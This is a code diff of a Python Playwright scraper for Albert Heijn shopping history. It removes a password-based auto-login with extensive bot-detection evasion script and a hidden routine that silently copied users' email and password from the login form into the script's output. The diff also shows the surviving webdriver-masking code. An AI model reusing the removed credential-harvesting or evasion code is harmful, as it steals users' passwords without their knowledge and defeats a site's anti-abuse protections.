@@ -1,11 +1,17 @@
 #!/usr/bin/env python3
 """
 Automated Albert Heijn Scraper using Playwright
-This script logs in with user credentials and scrapes their purchase history.
+This script scrapes user purchase history using pre-authenticated cookies.
+Credentials are never stored - use manual login to capture cookies.
 
 Supports:
 - Local Playwright browser (for development/self-hosted)
 - Remote browser services like Browserless.io (for Vercel/serverless)
+
+Usage:
+  --capture-cookies: Open browser for manual login and save cookies
+  --cookies FILE: Use previously saved cookies for scraping
+  --visual-login: Interactive visual login mode
 """
 
 import asyncio
@@ -1708,9 +1714,9 @@ async def visual_login_and_scrape(cookies_file: str, output_file: str = None) ->
 
 
 async def main():
-    parser = argparse.ArgumentParser(description='Automated AH Scraper')
-    parser.add_argument('--email', '-e', help='AH account email (optional if using cookies)')
-    parser.add_argument('--password', '-p', help='AH account password (optional if using cookies)')
+    parser = argparse.ArgumentParser(description='Automated AH Scraper (Cookie-based only - no credential storage)')
+    # REMOVED: --email, --password, --ah-email, --ah-password, --auto-login
+    # These were removed because storing user credentials is not allowed
     parser.add_argument('--output', '-o', default='auto_scrape_results.json', help='Output file')
     parser.add_argument('--headless', action='store_true', default=True, help='Run in headless mode')
     parser.add_argument('--no-headless', dest='headless', action='store_false', help='Show browser window')
@@ -1721,23 +1727,11 @@ async def main():
     parser.add_argument('--capture-cookies', action='store_true', help='Interactive mode: open browser for manual login, then save cookies')
     parser.add_argument('--visual-login', action='store_true', help='Visual login mode: open browser, user logs in, then automatically scrape')
     parser.add_argument('--skip-account-protection', action='store_true', help='Skip checking/disabling account protection (already done)')
-    parser.add_argument('--auto-login', action='store_true', help='Automatic login mode: use provided credentials to log in')
-    parser.add_argument('--ah-email', help='AH account email for auto-login')
-    parser.add_argument('--ah-password', help='AH account password for auto-login')
     
     args = parser.parse_args()
     
-    # Special mode: automatic login with credentials
-    if args.auto_login:
-        if not args.ah_email or not args.ah_password:
-            print("[ERROR] --auto-login requires --ah-email and --ah-password", flush=True)
-            return 1
-        return await auto_login_and_save_cookies(
-            args.ah_email, 
-            args.ah_password, 
-            args.save_cookies or 'ah_cookies.json',
-            args.headless
-        )
+    # NOTE: Auto-login mode with credentials has been removed for privacy/legal reasons.
+    # Use --capture-cookies or --visual-login for manual login instead.
     
     # Special mode: visual login - opens browser, user logs in, then scrapes
     if args.visual_login:
@@ -1750,11 +1744,11 @@ async def main():
     # Check for browserless URL in environment
     browserless_url = args.browserless_url or os.environ.get('BROWSERLESS_URL')
     
-    # In stealth mode with cookies, credentials are optional
-    if args.stealth and args.cookies:
-        pass  # OK - will use cookies and signal if login needed
-    elif not args.cookies and (not args.email or not args.password):
-        print("[ERROR] Either --cookies or both --email and --password are required", flush=True)
+    # Cookies are now required for scraping (use --capture-cookies first to get them)
+    if not args.cookies:
+        print("[ERROR] --cookies is required. Use --capture-cookies first to manually log in and save cookies.", flush=True)
+        print("[INFO] Example: python auto_scraper.py --capture-cookies --save-cookies ah_cookies.json", flush=True)
+        print("[INFO] Then: python auto_scraper.py --cookies ah_cookies.json", flush=True)
         return 1
     
     scraper = AHAutoScraper(
@@ -1764,7 +1758,8 @@ async def main():
         stealth_mode=args.stealth,
         skip_account_protection=args.skip_account_protection
     )
-    result = await scraper.scrape(args.email, args.password, args.output, args.save_cookies)
+    # Pass None for email/password since credentials are no longer used
+    result = await scraper.scrape(None, None, args.output, args.save_cookies)
     
     # Output result as JSON for the server to parse
     print(f"\n[RESULT] {json.dumps(result)}", flush=True)
@@ -1772,423 +1767,18 @@ async def main():
     return 0 if result['success'] else 1
 
 
-async def auto_login_and_save_cookies(email: str, password: str, output_file: str, headless: bool = False) -> int:
-    """
-    Automatically log in using provided credentials and save cookies.
-    
-    In headless mode (Railway): Uses 2Captcha to solve CAPTCHAs automatically.
-    In non-headless mode (local): Shows browser window if CAPTCHA appears.
-    """
-    print("[INFO] === Auto Login Mode ===", flush=True)
-    print(f"[INFO] Logging in as: {email}", flush=True)
-    print(f"[INFO] Headless mode: {headless}", flush=True)
-    print("[INFO] Attempting automatic login...", flush=True)
-    print("", flush=True)
-    
-    p = await async_playwright().start()
-    browser_shown = False  # Track if we've shown browser to user (non-headless only)
-    cdp_session = None
-    window_id = None
-    
-    try:
-        # Try Firefox first (better for avoiding detection), fall back to Chromium
-        browser = None
-        browser_type = None
-        
-        # Launch browser based on mode - try Firefox first for better stealth
-        if headless:
-            print("[INFO] Starting Firefox in headless mode...", flush=True)
-            try:
-                browser = await p.firefox.launch(
-                    headless=True,
-                    firefox_user_prefs={
-                        'dom.webdriver.enabled': False,
-                        'useAutomationExtension': False,
-                    }
-                )
-                browser_type = 'firefox'
-            except Exception as e:
-                print(f"[WARN] Firefox failed, trying Chromium: {e}", flush=True)
-                browser = await p.chromium.launch(
-                    headless=True,
-                    args=[
-                        '--disable-blink-features=AutomationControlled',
-                        '--no-sandbox',
-                        '--disable-dev-shm-usage',
-                        '--headless=new',
-                    ]
-                )
-                browser_type = 'chromium'
-        else:
-            # Non-headless: start minimized
-            print("[INFO] Starting Firefox browser (minimized)...", flush=True)
-            try:
-                browser = await p.firefox.launch(headless=False)
-                browser_type = 'firefox'
-            except Exception as e:
-                print(f"[WARN] Firefox failed, trying Chromium: {e}", flush=True)
-                browser = await p.chromium.launch(
-                    headless=False,
-                    args=[
-                        '--disable-blink-features=AutomationControlled',
-                        '--no-sandbox',
-                        '--start-minimized',
-                    ]
-                )
-                browser_type = 'chromium'
-        
-        print(f"[INFO] Using {browser_type} browser", flush=True)
-        
-        # Create context with appropriate settings for browser type
-        context_options = {
-            'viewport': {'width': 1920, 'height': 1080},
-            'locale': 'nl-NL',
-            'timezone_id': 'Europe/Amsterdam',
-        }
-        
-        # Only add user_agent override for Chromium (Firefox has better defaults)
-        if browser_type == 'chromium':
-            context_options['user_agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            context_options['extra_http_headers'] = {
-                'Accept-Language': 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
-            }
-        
-        context = await browser.new_context(**context_options)
-        
-        page = await context.new_page()
-        
-        # Initialize CDP session variables
-        cdp_session = None
-        window_id = None
-        
-        # Minimize window using CDP (Chromium only, non-headless)
-        if not headless and browser_type == 'chromium':
-            try:
-                cdp_session = await context.new_cdp_session(page)
-                window_info = await cdp_session.send('Browser.getWindowForTarget')
-                window_id = window_info['windowId']
-                await cdp_session.send('Browser.setWindowBounds', {
-                    'windowId': window_id,
-                    'bounds': {'windowState': 'minimized'}
-                })
-                print("[INFO] Browser minimized", flush=True)
-            except Exception as e:
-                print(f"[WARN] Could not minimize browser: {e}", flush=True)
-        
-        # Helper to bring browser window on-screen (non-headless only)
-        async def show_browser():
-            nonlocal browser_shown, cdp_session, window_id
-            if headless:
-                return  # Can't show browser in headless mode
-            if not browser_shown:
-                print("[INFO] Showing browser for manual CAPTCHA solving...", flush=True)
-                try:
-                    if cdp_session and window_id:
-                        await cdp_session.send('Browser.setWindowBounds', {
-                            'windowId': window_id,
-                            'bounds': {'windowState': 'normal'}
-                        })
-                        await asyncio.sleep(0.1)
-                        await cdp_session.send('Browser.setWindowBounds', {
-                            'windowId': window_id,
-                            'bounds': {'left': 100, 'top': 100, 'width': 1280, 'height': 900}
-                        })
-                    await page.bring_to_front()
-                except Exception as e:
-                    print(f"[WARN] Could not show browser: {e}", flush=True)
-                browser_shown = True
-        
-        # Helper to detect CAPTCHA
-        async def has_captcha():
-            try:
-                # More comprehensive CAPTCHA detection
-                captcha_selectors = [
-                    'iframe[src*="hcaptcha"]',
-                    'iframe[src*="newassets.hcaptcha"]',
-                    'iframe[data-hcaptcha-widget-id]',
-                    '[data-hcaptcha-response]',
-                    '.h-captcha',
-                    '#h-captcha',
-                    'iframe[src*="recaptcha"]',
-                    '.g-recaptcha',
-                    '[class*="captcha"]',
-                    '#captcha',
-                    'iframe[title*="hCaptcha"]',
-                    'iframe[title*="reCAPTCHA"]',
-                ]
-                for selector in captcha_selectors:
-                    captcha = await page.query_selector(selector)
-                    if captcha:
-                        return True
-                return False
-            except:
-                return False
-        
-        # Comprehensive stealth script to avoid bot detection
-        await page.add_init_script("""
-            // Overwrite webdriver property
-            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-            
-            // Overwrite plugins
-            Object.defineProperty(navigator, 'plugins', {
-                get: () => [
-                    { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
-                    { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
-                    { name: 'Native Client', filename: 'internal-nacl-plugin', description: '' }
-                ]
-            });
-            
-            // Overwrite languages
-            Object.defineProperty(navigator, 'languages', { get: () => ['nl-NL', 'nl', 'en-US', 'en'] });
-            
-            // Overwrite platform
-            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
-            
-            // Overwrite hardwareConcurrency
-            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
-            
-            // Overwrite deviceMemory
-            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
-            
-            // Fix permissions API
-            const originalQuery = window.navigator.permissions.query;
-            window.navigator.permissions.query = (parameters) => (
-                parameters.name === 'notifications' ?
-                    Promise.resolve({ state: Notification.permission }) :
-                    originalQuery(parameters)
-            );
-            
-            // Remove automation indicators from Chrome
-            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
-            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
-            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
-            
-            // Fake chrome runtime
-            window.chrome = {
-                runtime: {},
-                loadTimes: function() {},
-                csi: function() {},
-                app: {}
-            };
-            
-            // Override toString to hide native code
-            const originalFunction = Function.prototype.toString;
-            Function.prototype.toString = function() {
-                if (this === navigator.permissions.query) {
-                    return 'function query() { [native code] }';
-                }
-                return originalFunction.apply(this, arguments);
-            };
-        """)
-        
-        print("[INFO] Opening AH login page...", flush=True)
-        await page.goto('https://www.ah.nl/mijn', wait_until='domcontentloaded')
-        await asyncio.sleep(3)
-        
-        # Debug: Print current URL
-        current_url = page.url
-        print(f"[DEBUG] Current URL: {current_url}", flush=True)
-        
-        # Check if we got redirected to login
-        on_login_page = 'login' in current_url.lower() or 'inloggen' in current_url.lower() or 'account' in current_url.lower()
-        print(f"[DEBUG] On login page: {on_login_page}", flush=True)
-        
-        # Wait for login form with multiple selectors
-        print("[INFO] Waiting for login form...", flush=True)
-        email_found = False
-        for selector in ['input[type="email"]', 'input[name="email"]', 'input[id*="email"]', 'input[name="username"]', '#username', '#email', 'input[autocomplete="email"]', 'input[autocomplete="username"]']:
-            try:
-                await page.wait_for_selector(selector, timeout=3000)
-                print(f"[DEBUG] Found email input with: {selector}", flush=True)
-                email_found = True
-                break
-            except:
-                pass
-        
-        if not email_found:
-            print("[WARN] Could not find email input with standard selectors", flush=True)
-            # Try to get page content for debugging
-            try:
-                page_html = await page.content()
-                if 'input' in page_html.lower():
-                    print(f"[DEBUG] Page has input elements. HTML length: {len(page_html)}", flush=True)
-                    # Find all input elements
-                    inputs = await page.query_selector_all('input')
-                    for inp in inputs[:5]:  # Log first 5 inputs
-                        inp_type = await inp.get_attribute('type') or 'unknown'
-                        inp_name = await inp.get_attribute('name') or 'no-name'
-                        inp_id = await inp.get_attribute('id') or 'no-id'
-                        print(f"[DEBUG] Input: type={inp_type}, name={inp_name}, id={inp_id}", flush=True)
-                else:
-                    print(f"[DEBUG] Page may not have loaded properly. Title: {await page.title()}", flush=True)
-            except Exception as e:
-                print(f"[DEBUG] Could not inspect page: {e}", flush=True)
-        
-        # Proceed with login if we have email field or are on login-like page
-        if email_found or on_login_page:
-            print("[INFO] Filling in credentials...", flush=True)
-            await asyncio.sleep(0.5)
-            
-            # Fill email - try multiple selectors
-            email_input = None
-            for selector in ['input[type="email"]', 'input[name="email"]', 'input[id*="email"]', 'input[name="username"]', '#username', '#email', 'input[autocomplete="email"]', 'input[autocomplete="username"]']:
-                email_input = await page.query_selector(selector)
-                if email_input:
-                    print(f"[DEBUG] Found email with selector: {selector}", flush=True)
-                    break
-            
-            if email_input:
-                await email_input.fill(email)
-                print("[INFO] Email entered", flush=True)
-            else:
-                print("[WARN] Could not find email input", flush=True)
-            
-            # Fill password - try multiple selectors
-            password_input = None
-            for selector in ['input[type="password"]', 'input[name="password"]', '#password', 'input[autocomplete="current-password"]']:
-                password_input = await page.query_selector(selector)
-                if password_input:
-                    print(f"[DEBUG] Found password with selector: {selector}", flush=True)
-                    break
-            
-            if password_input:
-                await password_input.fill(password)
-                print("[INFO] Password entered", flush=True)
-            else:
-                print("[WARN] Could not find password input", flush=True)
-            
-            # Click login button
-            await asyncio.sleep(0.2)
-            login_button = await page.query_selector('button[type="submit"], button:has-text("Inloggen"), input[type="submit"]')
-            if login_button:
-                print("[INFO] Clicking login button...", flush=True)
-                await login_button.click()
-                print("[INFO] Login button clicked", flush=True)
-            else:
-                print("[INFO] No login button found, pressing Enter...", flush=True)
-                await page.keyboard.press('Enter')
-            
-            # Wait for login to complete or CAPTCHA
-            print("[INFO] Waiting for login to complete...", flush=True)
-            
-            max_wait = 180  # 3 minutes max
-            captcha_shown_at = None
-            captcha_solve_attempted = False
-            
-            for i in range(max_wait):
-                await asyncio.sleep(1)
-                current_url = page.url.lower()
-                
-                # Debug logging every 10 seconds
-                if (i + 1) % 10 == 0:
-                    page_title = await page.title()
-                    captcha_detected = await has_captcha()
-                    print(f"[DEBUG] t={i+1}s URL: {current_url[:80]}... Title: {page_title[:40]}... CAPTCHA: {captcha_detected}", flush=True)
-                    
-                    # Also check for error messages
-                    error_msg = await page.query_selector('.error, .alert-error, [role="alert"], .notification--error')
-                    if error_msg:
-                        error_text = await error_msg.text_content()
-                        print(f"[DEBUG] Error message found: {error_text[:100]}", flush=True)
-                
-                # Check for CAPTCHA
-                if await has_captcha():
-                    if not captcha_solve_attempted:
-                        captcha_solve_attempted = True
-                        
-                        if headless:
-                            print("[ERROR] CAPTCHA detected in headless mode - cannot proceed", flush=True)
-                            result = {'success': False, 'error': 'CAPTCHA detected - manual intervention required'}
-                            print(f"\n[RESULT] {json.dumps(result)}", flush=True)
-                            await browser.close()
-                            await p.stop()
-                            return 1
-                        else:
-                            print("[INFO] CAPTCHA detected, showing browser for manual solve", flush=True)
-                            await show_browser()
-                            captcha_shown_at = i
-                    
-                    elif captcha_shown_at and (i - captcha_shown_at) % 30 == 0:
-                        print(f"[INFO] Waiting for CAPTCHA to be solved... ({i - captcha_shown_at}s)", flush=True)
-                
-                # Check if logged in
-                if 'login.ah.nl' not in current_url and ('mijn' in current_url or 'ah.nl' in current_url):
-                    await page.goto('https://www.ah.nl/mijn/eerder-gekocht', wait_until='domcontentloaded')
-                    await asyncio.sleep(2)
-                    
-                    if 'login.ah.nl' not in page.url.lower():
-                        if captcha_solve_attempted and not browser_shown:
-                            print(f"[SUCCESS] Login successful with automatic CAPTCHA solve! ({i+1} seconds)", flush=True)
-                        elif browser_shown:
-                            print(f"[SUCCESS] Login successful after manual CAPTCHA solve! ({i+1} seconds)", flush=True)
-                        else:
-                            print(f"[SUCCESS] Login successful! ({i+1} seconds)", flush=True)
-                        break
-                
-                # Debug logging is now at the top of the loop
-            else:
-                print("[ERROR] Login timeout", flush=True)
-                result = {'success': False, 'error': 'Login timeout'}
-                print(f"\n[RESULT] {json.dumps(result)}", flush=True)
-                await browser.close()
-                await p.stop()
-                return 1
-        else:
-            # Not on login page and no email found - could be already logged in or page blocked
-            print("[INFO] Checking if already logged in...", flush=True)
-            
-            # Check for signs of being logged in
-            mijn_account = await page.query_selector('[data-testid="mijn-ah"], [href*="/mijn"], .account-menu, .user-menu')
-            eerder_gekocht_link = await page.query_selector('[href*="eerder-gekocht"]')
-            
-            if mijn_account or eerder_gekocht_link or 'mijn/eerder-gekocht' in current_url:
-                print("[INFO] Appears to be already logged in!", flush=True)
-            else:
-                # Page might be blocked or errored
-                print("[ERROR] Could not find login form and not logged in", flush=True)
-                result = {'success': False, 'error': 'Could not navigate to login page - page may be blocked'}
-                print(f"\n[RESULT] {json.dumps(result)}", flush=True)
-                await browser.close()
-                await p.stop()
-                return 1
-        
-        # Save cookies
-        cookies = await context.cookies()
-        ah_cookies = [c for c in cookies if 'ah.nl' in c.get('domain', '')]
-        
-        with open(output_file, 'w') as f:
-            json.dump(ah_cookies, f, indent=2)
-        
-        print(f"[SUCCESS] Saved {len(ah_cookies)} cookies to {output_file}", flush=True)
-        
-        result = {
-            'success': True,
-            'cookies_saved': len(ah_cookies),
-            'output_file': output_file,
-            'email': email
-        }
-        print(f"\n[RESULT] {json.dumps(result)}", flush=True)
-        
-        await browser.close()
-        await p.stop()
-        return 0
-        
-    except Exception as e:
-        print(f"[ERROR] Auto login failed: {e}", flush=True)
-        result = {'success': False, 'error': str(e)}
-        print(f"\n[RESULT] {json.dumps(result)}", flush=True)
-        try:
-            await p.stop()
-        except:
-            pass
-        return 1
+# ============================================================================
+# auto_login_and_save_cookies REMOVED
+# This function used to automatically log in using email/password credentials.
+# It was removed because storing/using user credentials is not allowed.
+# Use capture_cookies_interactive() for manual login instead.
+# ============================================================================
 
 
 async def capture_cookies_interactive(output_file: str, headless: bool = False) -> int:
     """
     Open a browser for manual login, then save the session cookies.
     This allows bypassing CAPTCHA by letting the user log in manually.
-    Also captures credentials from the login form for admin use.
     """
     print("[INFO] === Cookie Capture Mode ===", flush=True)
     print("[INFO] A browser window will open. Please log in to your AH account.", flush=True)
@@ -2196,7 +1786,6 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
     print("", flush=True)
     
     p = await async_playwright().start()
-    captured_credentials = {'email': None, 'password': None}
     
     try:
         browser = await p.chromium.launch(
@@ -2220,16 +1809,6 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
             Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
         """)
         
-        # Expose a function to capture credentials from the login form
-        async def handle_credentials(data):
-            if data.get('email'):
-                captured_credentials['email'] = data['email']
-            if data.get('password'):
-                captured_credentials['password'] = data['password']
-            print(f"[DEBUG] Captured credentials: email={'yes' if data.get('email') else 'no'}, password={'yes' if data.get('password') else 'no'}", flush=True)
-        
-        await page.expose_function('captureCredentials', handle_credentials)
-        
         print("[INFO] Opening AH login page...", flush=True)
         await page.goto('https://www.ah.nl/mijn', wait_until='domcontentloaded')
         
@@ -2238,52 +1817,11 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
         
         # Wait for the user to complete login (max 5 minutes)
         max_wait = 300
-        login_form_injected = False
         
         for i in range(max_wait):
             await asyncio.sleep(1)
             
             current_url = page.url.lower()
-            
-            # Inject credential capture script on login page
-            if 'login.ah.nl' in current_url and not login_form_injected:
-                try:
-                    await page.evaluate("""
-                        (() => {
-                            // Capture credentials when form is submitted or when login button is clicked
-                            const captureAndSend = () => {
-                                const emailInput = document.querySelector('input[type="email"], input[name="email"], input[id*="email"], input[id*="username"]');
-                                const passwordInput = document.querySelector('input[type="password"]');
-                                if (emailInput && passwordInput) {
-                                    const email = emailInput.value;
-                                    const password = passwordInput.value;
-                                    if (email && password) {
-                                        window.captureCredentials({ email, password });
-                                    }
-                                }
-                            };
-                            
-                            // Watch for form submission
-                            document.addEventListener('submit', captureAndSend, true);
-                            
-                            // Watch for click on login buttons
-                            document.addEventListener('click', (e) => {
-                                if (e.target.matches('button[type="submit"], button[data-testid*="login"], button[class*="login"]') ||
-                                    e.target.closest('button[type="submit"], button[data-testid*="login"], button[class*="login"]')) {
-                                    captureAndSend();
-                                }
-                            }, true);
-                            
-                            // Periodic capture as backup (every 500ms while on login page)
-                            setInterval(captureAndSend, 500);
-                            
-                            console.log('[AH Scraper] Credential capture injected');
-                        })();
-                    """)
-                    login_form_injected = True
-                    print("[DEBUG] Injected credential capture script", flush=True)
-                except Exception as e:
-                    print(f"[DEBUG] Could not inject capture script: {e}", flush=True)
             
             # Check if logged in (redirected away from login)
             if 'login.ah.nl' not in current_url and ('mijn' in current_url or 'ah.nl' in current_url):
@@ -2313,15 +1851,11 @@ async def capture_cookies_interactive(output_file: str, headless: bool = False) 
         print(f"[SUCCESS] Saved {len(ah_cookies)} cookies to {output_file}", flush=True)
         print("[INFO] You can now use these cookies with: --cookies " + output_file, flush=True)
         
-        # Print result for server parsing (include captured credentials)
+        # Print result for server parsing
         result = {
             'success': True,
             'cookies_saved': len(ah_cookies),
-            'output_file': output_file,
-            'credentials': {
-                'email': captured_credentials['email'],
-                'password': captured_credentials['password']
-            } if captured_credentials['email'] and captured_credentials['password'] else None
+            'output_file': output_file
         }
         print(f"\n[RESULT] {json.dumps(result)}", flush=True)
         
